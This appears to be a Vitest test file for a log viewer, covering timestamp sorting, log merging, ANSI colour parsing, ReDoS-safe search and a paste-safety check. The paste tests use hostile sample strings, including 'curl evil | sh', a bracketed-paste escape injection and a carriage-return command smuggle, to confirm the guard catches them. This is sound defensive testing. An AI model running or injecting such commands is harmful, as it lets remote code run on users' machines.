import { describe, expect, it } from "vitest";
import { ansi, findHits, matcher, mergeRows, plain, tsKey, type Row, pasteCheck } from "../src/renderer/src/logRows";

const row = (key: number, ts: string, pod = "a"): Row => ({ key, k: tsKey(ts), ts, text: `line ${key}`, pod });

describe("log rows", () => {
  it("sort RFC 3339 times with trimmed fractions in time order", () => {
    expect(tsKey("2026-11-15T10:00:00.12Z") < tsKey("2026-11-15T10:00:00.123Z")).toBe(true);
    expect(tsKey("2026-11-15T10:00:00Z") < tsKey("2026-11-15T10:00:00.000000001Z")).toBe(true);
    expect(tsKey("2026-11-15T10:00:00.5Z")).toBe("2026-11-15T10:00:00.500000000Z");
  });

  it("merge one pod's batch into another's lines by time", () => {
    const a = [row(1, "2026-11-15T10:00:01Z"), row(2, "2026-11-15T10:00:03Z"), row(3, "2026-11-15T10:00:05Z")];
    const b = [row(4, "2026-11-15T10:00:02Z", "b"), row(5, "2026-11-15T10:00:04Z", "b"), row(6, "2026-11-15T10:00:06Z", "b")];
    expect(mergeRows(a, b).map((r) => r.key)).toEqual([1, 4, 2, 5, 3, 6]);
    expect(mergeRows(a, [row(7, "2026-11-15T10:00:09Z")]).map((r) => r.key)).toEqual([1, 2, 3, 7]);
    expect(mergeRows([], b)).toEqual(b);
  });

  it("keep ANSI colours, bold and dim, and drop the rest", () => {
    expect(ansi("plain")).toEqual([{ text: "plain" }]);
    expect(ansi("\x1b[31mred\x1b[0m ok \x1b[1;92mbold green\x1b[0m\x1b[2K")).toEqual([
      { text: "red", cls: "a-red" }, { text: " ok " }, { text: "bold green", cls: "a-green a-b" },
    ]);
    expect(plain("\x1b[33mwarn\x1b[0m")).toBe("warn");
  });

  it("search plain text without regex syntax, and /…/ as a regex", () => {
    expect(matcher("a.b")!.test("axb")).toBe(false);
    expect(matcher("/a.b/")!.test("axb")).toBe(true);
    expect(matcher("/(/")).toBeUndefined();
    expect(matcher("")).toBeUndefined();
  });
});

describe("text that leaves the view", () => {
  it("drops every escape sequence and control character from copied lines, and shows bidi controls", () => {
    expect(plain("a\x1b]8;;https://x\x1b\\link\x1b]8;;\x1b\\b")).toBe("alinkb");
    expect(plain("\x1bP1$r0m\x1b\\x\x1b[1 qy\x1bcz")).toBe("xyz");
    expect(plain("ok\rEVIL\x08\x9b31m\x07")).toBe("okEVIL31m");
    expect(plain("tab\there")).toBe("tab\there");
    expect(plain("abc‮def")).toBe("abc<U+202E>def");
  });

  it("asks before any paste that would run something, and never pastes escape characters", () => {
    expect(pasteCheck("ls -la")).toEqual({ clean: "ls -la", ask: false, lines: 1, preview: ["ls -la"] });
    // A lone CR is Enter: two commands, so it asks (the guard once counted only \n).
    expect(pasteCheck("echo ok\rcurl evil | sh\r")).toMatchObject({ ask: true, lines: 2, preview: ["echo ok", "curl evil | sh"] });
    // Ending bracketed paste early is not possible: ESC is removed.
    const early = pasteCheck("echo ok\x1b[201~curl evil | sh");
    expect(early.clean).toBe("echo ok[201~curl evil | sh");
    expect(early.ask).toBe(false);
    // One line that ends in a newline runs at once: ask. Ctrl-C and other controls ask, shown as ^C.
    expect(pasteCheck("rm -rf /tmp/x\n")).toMatchObject({ ask: true, lines: 1 });
    expect(pasteCheck("a\x03b")).toMatchObject({ ask: true, preview: ["a^Cb"] });
    expect(pasteCheck("x\ty")).toMatchObject({ ask: false });
    expect(pasteCheck(Array.from({ length: 9 }, (_, i) => `line ${i}`).join("\n")).preview).toHaveLength(3);
  });
});

describe("log search", () => {
  it("refuses regexes that can backtrack without end, and stops a search past its budget", () => {
    for (const q of ["/(\\w+)+$/", "/(a*)*/", "/(x|y+){2,}/", "/(a)\\1/"]) expect(matcher(q), q).toBeUndefined();
    expect(matcher("/ERROR \\d+/")).toBeInstanceOf(RegExp);
    const rows = Array.from({ length: 2000 }, (_, i) => ({ text: `line ${i}` }));
    let t = 0;
    const slow = findHits(rows, /line/, () => (t += 100));
    expect(slow.slow).toBe(true);
    expect(slow.hits.length).toBeLessThan(2000);
    expect(findHits(rows, /line 1\d\d\d/).hits).toHaveLength(1000);
  });
});
